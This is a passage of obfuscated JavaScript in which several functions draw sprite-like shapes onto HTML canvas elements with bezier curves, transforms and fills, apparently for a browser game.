			Δ.bezierCurveTo(ᐃ * 50, 152 * ᐃ, 55 * ᐃ, ᐃ * 145, ᐃ * 54, ᐃ * 134);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆⵠΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 65.25, 135 * ᐃ);
			Δ.bezierCurveTo(75.25 * ᐃ, ᐃ * 128, 83.25 * ᐃ, 133 * ᐃ, ᐃ * 83.25, ᐃ * 138);
			Δ.bezierCurveTo(88.25 * ᐃ, 148 * ᐃ, ᐃ * 61.25, ᐃ * 149, 64.25 * ᐃ, 137 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(74 * ᐃ, ᐃ * 145);
			Δ.bezierCurveTo(74 * ᐃ, ᐃ * 148, ᐃ * 74, ᐃ * 148, ᐃ * 74, ᐃ * 151);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔΔΔⲆ, Ⲇᐃ[6], ᐃ * 2);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * ΔΔΔΔⲆ, 58 * ᐃ);
			Δ.bezierCurveTo(ⲆⵠⲆⲆᐃ * ᐃ, 38 * ᐃ, ᐃ * ᐃⲆⲆⵠⵠΔΔ, 33 * ᐃ, 28 * ᐃ, 34 * ᐃ);
			Δ.bezierCurveTo(41 * ᐃ, 39 * ᐃ, 45 * ᐃ, 45 * ᐃ, 50 * ᐃ, 51 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆⲆⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ⲆⵠᐃΔⲆ * ᐃ, 51 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 106, 36 * ᐃ, ᐃ * 119, ᐃ * 31, ᐃ * 128, 36 * ᐃ);
			Δ.bezierCurveTo(137 * ᐃ, 49 * ᐃ, 128 * ᐃ, ᐃ * 58, 128 * ᐃ, ᐃ * 60);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃⲆΔΔ]);
			return Ⲇⵠ
		}

		function ᐃΔᐃⵠΔΔᐃ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 120;
			Ⲇⵠ.height = ᐃ * 320;
			Δ.translate(ᐃ * -60, ᐃ * -ⲆΔΔⵠⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(188.5 * ᐃ, ᐃ * 3.953125);
			Δ.bezierCurveTo(ᐃ * 188.5, ᐃ * 171.453125, ᐃ * 188.5, 171.453125 * ᐃ, 188.5 * ᐃ, 338.953125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 162.5, 268.953125 * ᐃ, ᐃ * 145.5, 265.953125 * ᐃ, ᐃ * 116.5, 244.953125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 67.5, ᐃ * 204.953125, ᐃ * 87.5, ᐃ * 160.953125, ᐃ * 113.5, ᐃ * 125.953125);
			Δ.bezierCurveTo(141.5 * ᐃ, ᐃ * 90.953125, 176.5 * ᐃ, ᐃ * 56.953125, 188.5 * ᐃ, 3.953125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃᐃᐃ]);
			return Ⲇⵠ
		}

		function ⵠᐃⲆΔⵠⵠⵠ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 120 * ᐃ;
			Ⲇⵠ.height = 300 * ᐃ;
			Δ.translate(ᐃ * -200, ᐃ * -40);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 344, 18.40625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 345, 361.40625 * ᐃ, ᐃ * 344, 191.40625 * ᐃ, ᐃ * 344, 364.40625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 261, 275.40625 * ᐃ, 274 * ᐃ, 259.40625 * ᐃ, ᐃ * 229, 213.40625 * ᐃ);
			Δ.bezierCurveTo(199 * ᐃ, ᐃ * 187.40625, 222 * ᐃ, 133.40625 * ᐃ, 273 * ᐃ, ᐃ * 100.40625);
			Δ.bezierCurveTo(321 * ᐃ, ᐃ * 71.40625, ᐃ * 327, ᐃ * 34.40625, ᐃ * 344, ᐃ * 18.40625);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃΔΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 335, ᐃ * 38.072906494140625);
			Δ.bezierCurveTo(ᐃ * 307, 62.072906494140625 * ᐃ, 291 * ᐃ, ᐃ * 60.072906494140625, ᐃ * 262, ᐃ * 68.07290649414062);
			Δ.bezierCurveTo(ᐃ * 223, ᐃ * 80.07290649414062, ᐃ * 225, ᐃ * 111.07290649414062, ᐃ * 264, ᐃ * 139.07290649414062);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆᐃⵠ]);
			return Ⲇⵠ
		}

		function ΔᐃᐃΔⵠΔⵠ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 120 * ᐃ;
			Ⲇⵠ.height = ᐃ * 300;
			Δ.translate(-80 * ᐃ, -20);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(200.5 * ᐃ, ᐃ * 14.953125);
			Δ.bezierCurveTo(ᐃ * 203, ᐃ * 171.953125, ᐃ * 203, 171.953125 * ᐃ, ᐃ * 205.5, 328.953125 * ᐃ);
			Δ.bezierCurveTo(188.5 * ᐃ, ᐃ * 257.953125, 164.5 * ᐃ, 216.953125 * ᐃ, ᐃ * 166.5, 176.953125 * ᐃ);
			Δ.bezierCurveTo(168.5 * ᐃ, 133.953125 * ᐃ, 198.5 * ᐃ, 98.953125 * ᐃ, 200.5 * ᐃ, ᐃ * 14.953125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ]);
			return Ⲇⵠ
		}
		const ΔᐃᐃⲆ = ⵠΔΔ;

		function ⲆⲆΔⵠΔΔΔΔⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 170;
			Ⲇⵠ.height = 170 * ᐃ;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ⵠΔᐃ;
			Δ.translate(-10 * ᐃ, ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(72.5 * ᐃ, 4.109375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 117, ᐃ * 9.609375, ᐃ * 117, ᐃ * 9.609375, ᐃ * 161.5, 15.109375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 134.5, ᐃ * 106.109375, 110.5 * ᐃ, ᐃ * 130.109375, 63.5 * ᐃ, 145.109375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 33.5, ᐃ * 120.609375, 33.5 * ᐃ, ᐃ * 120.609375, ᐃ * 3.5, 96.109375 * ᐃ);
			Δ.bezierCurveTo(82.5 * ᐃ, ᐃ * 75.109375, 69.5 * ᐃ, 29.109375 * ᐃ, 71.5 * ᐃ, ᐃ * 6.109375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ⵠΔⲆ;
			Δ.translate(ⵠⲆⲆᐃⵠ * ᐃ, -ⲆⵠΔΔᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 72.5, ᐃ * 4.109375);
			Δ.bezierCurveTo(117 * ᐃ, 9.609375 * ᐃ, ᐃ * 117, ᐃ * 9.609375, 161.5 * ᐃ, 15.109375 * ᐃ);
			Δ.bezierCurveTo(134.5 * ᐃ, ᐃ * 106.109375, 110.5 * ᐃ, ᐃ * 130.109375, 63.5 * ᐃ, ᐃ * 145.109375);
			Δ.bezierCurveTo(ᐃ * 33.5, 120.609375 * ᐃ, ᐃ * 33.5, 120.609375 * ᐃ, ᐃ * 3.5, ᐃ * 96.109375);
			Δ.bezierCurveTo(82.5 * ᐃ, 75.109375 * ᐃ, ᐃ * 69.5, 29.109375 * ᐃ, 71.5 * ᐃ, 6.109375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆ], Ⲇᐃ[2], ᐃ * ⵠⵠⲆΔΔ);
			return Ⲇⵠ
		}

		function ⵠⵠⵠΔᐃΔⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 46;
			Ⲇⵠ.height = ᐃ * 140;
			Δ.scale(-ΔⲆⵠ * ᐃ, Ⲇᐃⵠ * ᐃ);
			Δ.translate(ᐃ * -50, ᐃ * 40);
			Δ.translate(ᐃ * -20, Δᐃᐃᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ΔⲆᐃᐃ;
			Δ.translate(ᐃ * 10, ᐃⵠⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 22.599990844726562, ᐃ * 85.94999694824219);
			Δ.bezierCurveTo(17.599990844726562 * ᐃ, 83.94999694824219 * ᐃ, 17.599990844726562 * ᐃ, ᐃ * 83.94999694824219, ᐃ * 12.599990844726562, 81.94999694824219 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 19.599990844726562, 73.94999694824219 * ᐃ, ᐃ * 2.5999908447265625, ᐃ * 22.949996948242188, 33.59999084472656 * ᐃ, ᐃ * 7.9499969482421875);
			Δ.bezierCurveTo(27.599990844726562 * ᐃ, 28.949996948242188 * ᐃ, 33.59999084472656 * ᐃ, ᐃ * 26.949996948242188, ᐃ * 35.59999084472656, ᐃ * 32.94999694824219);
			Δ.bezierCurveTo(ᐃ * 25.599990844726562, 59.94999694824219 * ᐃ, 26.599990844726562 * ᐃ, ᐃ * 69.94999694824219, ᐃ * 29.599990844726562, 82.94999694824219 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.translate(-ⵠΔⲆ * ᐃ, ⵠⲆᐃⵠ);
			Δ.moveTo(17.599990844726562 * ᐃ, ᐃ * 89.75);
			Δ.bezierCurveTo(24.599990844726562 * ᐃ, 99.75 * ᐃ, 24.599990844726562 * ᐃ, 101.75 * ᐃ, 20.599990844726562 * ᐃ, ᐃ * 111.75);
			Δ.bezierCurveTo(28.599990844726562 * ᐃ, 110.75 * ᐃ, ᐃ * 26.599990844726562, ᐃ * 112.75, ᐃ * 28.599990844726562, ᐃ * 111.75);
			Δ.bezierCurveTo(ᐃ * 30.599990844726562, 96.75 * ᐃ, ᐃ * 32.59999084472656, 96.75 * ᐃ, 30.599990844726562 * ᐃ, ᐃ * 87.75);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.translate(ᐃ * ᐃᐃⵠ, 0);
			Δ.moveTo(7.5999908447265625 * ᐃ, 86.34999084472656 * ᐃ);
			Δ.bezierCurveTo(12.599990844726562 * ᐃ, ᐃ * 85.34999084472656, ᐃ * 14.599990844726562, 84.34999084472656 * ᐃ, 13.599990844726562 * ᐃ, ᐃ * 84.34999084472656);
			Δ.bezierCurveTo(ᐃ * 21.599990844726562, ᐃ * 83.34999084472656, 21.599990844726562 * ᐃ, ᐃ * 83.34999084472656, 29.599990844726562 * ᐃ, ᐃ * 82.34999084472656);
			Δ.bezierCurveTo(33.59999084472656 * ᐃ, 85.84999084472656 * ᐃ, ᐃ * 33.59999084472656, 85.84999084472656 * ᐃ, ᐃ * 37.59999084472656, ᐃ * 89.34999084472656);
			Δ.bezierCurveTo(34.09999084472656 * ᐃ, 91.84999084472656 * ᐃ, 34.09999084472656 * ᐃ, ᐃ * 91.84999084472656, 30.599990844726562 * ᐃ, 94.34999084472656 * ᐃ);
			Δ.bezierCurveTo(21.099990844726562 * ᐃ, ᐃ * 93.34999084472656, 21.099990844726562 * ᐃ, ᐃ * 93.34999084472656, 11.599990844726562 * ᐃ, ᐃ * 92.34999084472656);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆ]);
			Δ.save();
			Δ.translate(23.599990844726562 * ᐃ, 110.94999694824219 * ᐃ);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, -ⲆⲆⲆᐃΔ * ᐃ, -ΔᐃⵠⵠⲆ * ᐃ, ᐃ * ΔⵠⵠΔⵠᐃⲆ, ΔᐃΔⲆⲆ * ᐃ, ⲆⲆⲆΔᐃ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃΔΔ]);
			Δ.translate(Ⲇᐃᐃᐃ * ᐃ, ⵠⲆᐃⵠ);
			Δ.globalAlpha = ⵠΔⵠΔ;
			Δ.translate(ᐃ * ⲆⲆᐃΔΔ, ΔΔⵠⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(22.599990844726562 * ᐃ, ᐃ * 85.94999694824219);
			Δ.bezierCurveTo(17.599990844726562 * ᐃ, 83.94999694824219 * ᐃ, 17.599990844726562 * ᐃ, ᐃ * 83.94999694824219, ᐃ * 12.599990844726562, ᐃ * 81.94999694824219);
			Δ.bezierCurveTo(ᐃ * 19.599990844726562, ᐃ * 73.94999694824219, ᐃ * 2.5999908447265625, 22.949996948242188 * ᐃ, 33.59999084472656 * ᐃ, ᐃ * 7.9499969482421875);
			Δ.bezierCurveTo(27.599990844726562 * ᐃ, 28.949996948242188 * ᐃ, 33.59999084472656 * ᐃ, 26.949996948242188 * ᐃ, 35.59999084472656 * ᐃ, 32.94999694824219 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 25.599990844726562, 59.94999694824219 * ᐃ, 26.599990844726562 * ᐃ, ᐃ * 69.94999694824219, 29.599990844726562 * ᐃ, 82.94999694824219 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔⵠΔ], Ⲇᐃ[4], 3 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.translate(ᐃ * -1, 0);
			Δ.moveTo(ᐃ * 17.599990844726562, 89.75 * ᐃ);
			Δ.bezierCurveTo(24.599990844726562 * ᐃ, 99.75 * ᐃ, 24.599990844726562 * ᐃ, ᐃ * 101.75, 20.599990844726562 * ᐃ, 111.75 * ᐃ);
			Δ.bezierCurveTo(28.599990844726562 * ᐃ, ᐃ * 110.75, ᐃ * 26.599990844726562, ᐃ * 112.75, 28.599990844726562 * ᐃ, 111.75 * ᐃ);
			Δ.bezierCurveTo(30.599990844726562 * ᐃ, 96.75 * ᐃ, 32.59999084472656 * ᐃ, 96.75 * ᐃ, ᐃ * 30.599990844726562, ᐃ * 87.75);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠΔⵠ], Ⲇᐃ[ⲆⲆΔᐃ], 3 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.translate(1 * ᐃ, ΔⲆⵠⲆ);
			Δ.moveTo(7.5999908447265625 * ᐃ, 86.34999084472656 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 12.599990844726562, 85.34999084472656 * ᐃ, ᐃ * 14.599990844726562, 84.34999084472656 * ᐃ, ᐃ * 13.599990844726562, ᐃ * 84.34999084472656);
			Δ.bezierCurveTo(ᐃ * 21.599990844726562, ᐃ * 83.34999084472656, ᐃ * 21.599990844726562, 83.34999084472656 * ᐃ, 29.599990844726562 * ᐃ, 82.34999084472656 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 33.59999084472656, ᐃ * 85.84999084472656, 33.59999084472656 * ᐃ, ᐃ * 85.84999084472656, 37.59999084472656 * ᐃ, 89.34999084472656 * ᐃ);
			Δ.bezierCurveTo(34.09999084472656 * ᐃ, 91.84999084472656 * ᐃ, 34.09999084472656 * ᐃ, ᐃ * 91.84999084472656, 30.599990844726562 * ᐃ, ᐃ * 94.34999084472656);
			Δ.bezierCurveTo(ᐃ * 21.099990844726562, 93.34999084472656 * ᐃ, ᐃ * 21.099990844726562, 93.34999084472656 * ᐃ, ᐃ * 11.599990844726562, ᐃ * 92.34999084472656);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ΔⵠᐃⲆ], ΔᐃⲆΔ * ᐃ);
			Δ.save();
			Δ.translate(23.599990844726562 * ᐃ, 110.94999694824219 * ᐃ);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, -7 * ᐃ, -ᐃⵠⵠΔ * ᐃ, 14 * ᐃ, 8 * ᐃ, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃ], Ⲇᐃ[2], 3 * ᐃ);
			return Ⲇⵠ
		}

		function ᐃᐃΔᐃⵠⵠᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 202 * ᐃ;
			Ⲇⵠ.height = ᐃ * 202;
			Δ.translate(2 * ᐃ, ᐃ * 1);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : Ⲇᐃⵠ;
			Δ.translate(ⲆⲆⲆᐃ, 10 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 98, 41.15177917480469 * ᐃ);
			Δ.rotate(.8);
			Ⲇᐃᐃ(Δ, ᐃ * -ⵠⲆᐃⲆᐃΔⲆ, ᐃ * -16.5, ᐃ * 32, ᐃ * 33, ᐃ * ᐃⲆⲆᐃᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(ᐃ * 98, 22.5089111328125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 97.5, ᐃ * 41.5089111328125, 97.5 * ᐃ, ᐃ * 41.5089111328125, ᐃ * 97, 60.5089111328125 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[Ⲇⵠⵠᐃ]);
			Δ.save();
			Δ.translate(ᐃ * 147.5, 69.5089111328125 * ᐃ);
			Δ.rotate(.2);
			Ⲇᐃᐃ(Δ, ᐃ * -15.5, -ⵠΔⵠΔΔ * ᐃ, 31 * ᐃ, ᐃ * 32, 7 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃᐃⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 163, ᐃ * 59.50892639160156);
			Δ.bezierCurveTo(147 * ᐃ, 69.50892639160156 * ᐃ, ᐃ * 127, ᐃ * 82.50892639160156, ᐃ * 131, ᐃ * 79.50892639160156);
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠⵠΔ]);
			Δ.save();
			Δ.translate(143.5 * ᐃ, ᐃ * 128.2946319580078);
			Δ.rotate(1.24);
			Ⲇᐃᐃ(Δ, -16.5 * ᐃ, -17.5 * ᐃ, 33 * ᐃ, ᐃ * 35, ᐃᐃⵠⵠⵠ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃᐃⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(162 * ᐃ, ᐃ * 135.93748474121094);
			Δ.bezierCurveTo(ᐃ * 143.5, ᐃ * 128.43748474121094, 129 * ᐃ, ᐃ * 120.93748474121094, ᐃ * 125, ᐃ * 120.93748474121094);
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃᐃⵠ]);
			Δ.save();
			Δ.translate(ᐃ * 99, 156.08035278320312 * ᐃ);
			Δ.rotate(.84);
			Ⲇᐃᐃ(Δ, -18 * ᐃ, ᐃ * -ⲆⵠⵠⲆⲆ, ᐃ * 36, ᐃ * 36, ᐃ * ⲆᐃᐃᐃΔ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆⲆⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(98 * ᐃ, 136.08035278320312 * ᐃ);
			Δ.bezierCurveTo(98 * ᐃ, ᐃ * 156.08035278320312, ᐃ * 98, 156.08035278320312 * ᐃ, 98 * ᐃ, ᐃ * 176.08035278320312);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠΔ]);
			Δ.save();
			Δ.translate(54 * ᐃ, ᐃ * 72.22320556640625);
			Δ.rotate(1.32);
			Ⲇᐃᐃ(Δ, -ᐃⵠⲆΔΔ * ᐃ, ᐃ * -19, ᐃ * 36, 38 * ᐃ, 7 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(34 * ᐃ, ᐃ * 60.79463195800781);
			Δ.bezierCurveTo(ᐃ * 53.5, ᐃ * 72.29463195800781, ᐃ * 69, 79.79463195800781 * ᐃ, 73 * ᐃ, 83.79463195800781 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.save();
			Δ.translate(49 * ᐃ, ᐃ * 127.29463195800781);
			Δ.rotate(1.76);
			Ⲇᐃᐃ(Δ, -ᐃΔⲆⵠᐃ * ᐃ, ᐃ * -17.5, ᐃ * 40, ᐃ * 35, 7 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(ᐃ * 30, 141.7946319580078 * ᐃ);
			Δ.bezierCurveTo(47 * ᐃ, ᐃ * 130.2946319580078, ᐃ * 64, ᐃ * 119.79463195800781, ᐃ * 64, 118.79463195800781 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆⵠΔΔ]);
			Δ.globalAlpha = 1;
			Δ.translate(0, ᐃ * -10);
			Δ.save();
			Δ.translate(ᐃ * 98, ᐃ * 41.15177917480469);
			Δ.rotate(.8);
			Ⲇᐃᐃ(Δ, -ⵠᐃⵠⵠⲆ * ᐃ, ᐃ * -16.5, 32 * ᐃ, 33 * ᐃ, ᐃ * ᐃᐃᐃⵠᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠⵠ], Ⲇᐃ[4], ΔᐃΔⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 98, 22.5089111328125 * ᐃ);
			Δ.bezierCurveTo(97.5 * ᐃ, 41.5089111328125 * ᐃ, ᐃ * 97.5, 41.5089111328125 * ᐃ, ᐃ * 97, ᐃ * 60.5089111328125);
			ΔⲆ(Δ, ⵠΔᐃⲆΔ, Ⲇᐃ[ⵠΔᐃΔ], ᐃ * ᐃⲆⵠΔ);
			Δ.save();
			Δ.translate(ᐃ * 147.5, 69.5089111328125 * ᐃ);
			Δ.rotate(.2);
			Ⲇᐃᐃ(Δ, -15.5 * ᐃ, -16 * ᐃ, ᐃ * 31, 32 * ᐃ, ᐃ * 7);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆΔⵠ], Ⲇᐃ[4], 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(163 * ᐃ, 59.50892639160156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 147, 69.50892639160156 * ᐃ, 127 * ᐃ, 82.50892639160156 * ᐃ, 131 * ᐃ, 79.50892639160156 * ᐃ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠᐃΔΔ], ᐃ * ᐃᐃⲆᐃ);
			Δ.save();
			Δ.translate(ᐃ * 143.5, 128.2946319580078 * ᐃ);
			Δ.rotate(1.24);
			Ⲇᐃᐃ(Δ, ᐃ * -16.5, -17.5 * ᐃ, ᐃ * 33, ᐃ * 35, 7 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ᐃΔΔΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(ᐃ * 162, ᐃ * 135.93748474121094);
			Δ.bezierCurveTo(143.5 * ᐃ, ᐃ * 128.43748474121094, 129 * ᐃ, 120.93748474121094 * ᐃ, 125 * ᐃ, ᐃ * 120.93748474121094);
			ΔⲆ(Δ, ⲆΔΔΔⲆ, Ⲇᐃ[ΔΔⵠⵠΔ], ⵠⵠᐃⵠ * ᐃ);
			Δ.save();
			Δ.translate(99 * ᐃ, ᐃ * 156.08035278320312);
			Δ.rotate(.84);
			Ⲇᐃᐃ(Δ, -18 * ᐃ, ᐃ * -18, ᐃ * 36, ᐃ * 36, ᐃⵠᐃⵠⵠΔᐃ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(98 * ᐃ, 136.08035278320312 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 98, ᐃ * 156.08035278320312, ᐃ * 98, 156.08035278320312 * ᐃ, ᐃ * 98, 176.08035278320312 * ᐃ);
			ΔⲆ(Δ, ⲆⲆⲆⵠⵠ, Ⲇᐃ[ⵠⲆⵠᐃ], ᐃ * ⵠⲆᐃᐃ);
			Δ.save();
			Δ.translate(ᐃ * 54, 72.22320556640625 * ᐃ);
			Δ.rotate(1.32);
			Ⲇᐃᐃ(Δ, ᐃ * -ᐃᐃΔᐃⲆⵠᐃ, -ΔΔⲆᐃⵠ * ᐃ, ᐃ * 36, ᐃ * 38, ΔΔᐃⲆⲆ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃⵠ], Ⲇᐃ[ⵠᐃΔΔ], 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 34, 60.79463195800781 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 53.5, 72.29463195800781 * ᐃ, ᐃ * 69, 79.79463195800781 * ᐃ, 73 * ᐃ, 83.79463195800781 * ᐃ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[4], ᐃ * ⲆΔΔᐃ);
			Δ.save();
			Δ.translate(49 * ᐃ, ᐃ * 127.29463195800781);
			Δ.rotate(1.76);
			Ⲇᐃᐃ(Δ, -ⲆᐃᐃΔΔ * ᐃ, -17.5 * ᐃ, 40 * ᐃ, ᐃ * 35, 7 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⵠΔΔᐃΔ], 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(30 * ᐃ, ᐃ * 141.7946319580078);
